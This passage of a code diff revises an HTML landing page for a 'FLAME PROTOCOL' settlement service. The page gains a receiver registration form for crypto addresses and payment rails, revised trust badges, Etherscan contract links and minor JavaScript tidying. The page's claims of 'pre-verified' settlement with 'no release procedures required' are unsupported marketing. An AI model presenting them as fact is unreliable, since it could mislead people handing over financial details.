+                            <label for="eth-address">Ethereum Address (for ETH/USDT/USDC)</label>
+                            <input type="text" id="eth-address" name="ETH_Address" placeholder="0x...">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="btc-address">Bitcoin Address</label>
+                            <input type="text" id="btc-address" name="BTC_Address" placeholder="bc1q... or 3...">
+                        </div>
+                        
+                        <!-- Preferred Rail -->
+                        <div class="form-group" style="margin-top: 32px;">
+                            <label for="preferred-rail">Preferred Settlement Rail <span class="required">*</span></label>
+                            <select id="preferred-rail" name="Preferred_Rail" required>
+                                <option value="">Select your preferred rail...</option>
+                                <option value="ACH">ACH (US Domestic)</option>
+                                <option value="SWIFT">SWIFT (International Wire)</option>
+                                <option value="ETH">Ethereum (ETH)</option>
+                                <option value="USDT">USDT (Tether)</option>
+                                <option value="USDC">USDC (Circle)</option>
+                                <option value="BTC">Bitcoin</option>
+                                <option value="Multiple">Multiple Rails</option>
                             </select>
                         </div>
+                        
                         <div class="form-group">
-                            <label for="message">Additional Information</label>
-                            <textarea id="message" name="Message" placeholder="Tell us about your specific requirements, timeline, or questions..."></textarea>
+                            <label for="notes">Additional Notes</label>
+                            <textarea id="notes" name="Notes" placeholder="Any specific requirements, questions, or integration notes..."></textarea>
                         </div>
+                        
                         <button type="submit" class="btn btn-primary btn-full">
-                            <span>Submit Request</span>
+                            <span>Submit Registration</span>
                             <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                 <path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/>
                             </svg>
                         </button>
+                        
                         <p class="form-note">
-                            Requests typically processed within 24 hours.<br>
-                            Questions? Email <a href="mailto:yolewis@c-yess.org">yolewis@c-yess.org</a>
+                            We'll contact you within 24 hours to complete onboarding.<br>
+                            Questions? <a href="mailto:yolewis@c-yess.org">yolewis@c-yess.org</a>
                         </p>
                     </form>
                 </div>
@@ -836,20 +855,20 @@ a { transition: all 0.2s ease; }
                 <h4>Built on Proven Standards</h4>
                 <div class="trust-items">
                     <div class="trust-item">
+                        <span class="trust-label">Settlement</span>
+                        <span class="trust-value">Atomic / Pre-Verified</span>
+                    </div>
+                    <div class="trust-item">
+                        <span class="trust-label">Verification</span>
+                        <span class="trust-value">Ethereum Mainnet</span>
+                    </div>
+                    <div class="trust-item">
+                        <span class="trust-label">Rails</span>
+                        <span class="trust-value">ACH / SWIFT / ISO20022 / Crypto</span>
+                    </div>
+                    <div class="trust-item">
                         <span class="trust-label">Cryptography</span>
-                        <span class="trust-value">SHA3-256 / Ed25519 / SPHINCS+</span>
-                    </div>
-                    <div class="trust-item">
-                        <span class="trust-label">Banking Rails</span>
-                        <span class="trust-value">SWIFT MT103 / ISO 20022 / ACH</span>
-                    </div>
-                    <div class="trust-item">
-                        <span class="trust-label">Blockchain</span>
-                        <span class="trust-value">Ethereum Mainnet / USDT / USDC</span>
-                    </div>
-                    <div class="trust-item">
-                        <span class="trust-label">Security</span>
-                        <span class="trust-value">HSM / YubiKey / Air-Gap Ready</span>
+                        <span class="trust-value">SHA3-256 / Ed25519</span>
                     </div>
                 </div>
             </div>
@@ -865,26 +884,25 @@ a { transition: all 0.2s ease; }
                         <span class="logo-mark">◈</span>
                         <span class="logo-text">FLAME<span class="logo-suffix">PROTOCOL</span></span>
                     </a>
-                    <p>Deterministic settlement infrastructure for institutional finance.</p>
+                    <p>Pre-verified, liquid settlement infrastructure. No release procedures required.</p>
                 </div>
                 <div class="footer-links">
                     <div class="footer-column">
                         <h5>Verify on Mainnet</h5>
                         <a href="https://etherscan.io/address/0x90206A9888E3963c22f6AD1c79245b6250CFc016" target="_blank">Treasury Contract</a>
-                        <a href="https://etherscan.io/address/0x67CFB9bFC401fdf4F15F38E821df55787fDe236f" target="_blank">Registry Contract</a>
                         <a href="https://etherscan.io/address/0x6cA24fe8e6550bc2B2A6E56F78855061768Bc4c7" target="_blank">P-Verifier Contract</a>
-                        <a href="https://etherscan.io/address/0x600D6c7BFD61a245F33B9AEbc634A876E1caFDC0" target="_blank">AEON Core Token</a>
+                        <a href="https://etherscan.io/address/0x67CFB9bFC401fdf4F15F38E821df55787fDe236f" target="_blank">Registry Contract</a>
                     </div>
                     <div class="footer-column">
                         <h5>Protocol</h5>
-                        <a href="#verification">Four Pillars</a>
-                        <a href="#determinism">Determinism</a>
-                        <a href="#download">Request Access</a>
+                        <a href="#aha">How It Works</a>
+                        <a href="#validate">Validation Process</a>
+                        <a href="#register">Register as Receiver</a>
                     </div>
                     <div class="footer-column">
                         <h5>Contact</h5>
                         <a href="mailto:yolewis@c-yess.org">yolewis@c-yess.org</a>
-                        <a href="#download">Integration Support</a>
+                        <a href="#register">Integration Support</a>
                     </div>
                 </div>
             </div>
@@ -896,19 +914,18 @@ a { transition: all 0.2s ease; }
     </footer>
 
     <script>
-    // Mobile navigation toggle
+    // Mobile navigation
     document.getElementById('nav-toggle').addEventListener('click', function() {
         document.getElementById('nav-links').classList.toggle('open');
     });
 
-    // Close mobile nav on link click
     document.querySelectorAll('.nav-links a').forEach(link => {
         link.addEventListener('click', () => {
             document.getElementById('nav-links').classList.remove('open');
         });
     });
 
-    // Smooth scroll for anchor links
+    // Smooth scroll
     document.querySelectorAll('a[href^="#"]').forEach(anchor => {
         anchor.addEventListener('click', function(e) {
             const href = this.getAttribute('href');
@@ -926,22 +943,18 @@ a { transition: all 0.2s ease; }
         });
     });
 
-    // Form submission feedback
-    const form = document.getElementById('access-form');
+    // Form submission
+    const form = document.getElementById('receiver-form');
     form.addEventListener('submit', function(e) {
         const btn = form.querySelector('button[type="submit"]');
-        btn.innerHTML = '<span>Sending...</span>';
+        btn.innerHTML = '<span>Submitting...</span>';
         btn.disabled = true;
     });
 
-    // Nav background on scroll
+    // Nav scroll effect
     window.addEventListener('scroll', () => {
         const nav = document.querySelector('.nav');
-        if (window.scrollY > 50) {
-            nav.style.background = 'rgba(10, 22, 40, 0.98)';
-        } else {
-            nav.style.background = 'rgba(10, 22, 40, 0.95)';
-        }
+        nav.style.background = window.scrollY > 50 ? 'rgba(10, 22, 40, 0.98)' : 'rgba(10, 22, 40, 0.95)';
     });
     </script>
 </body>
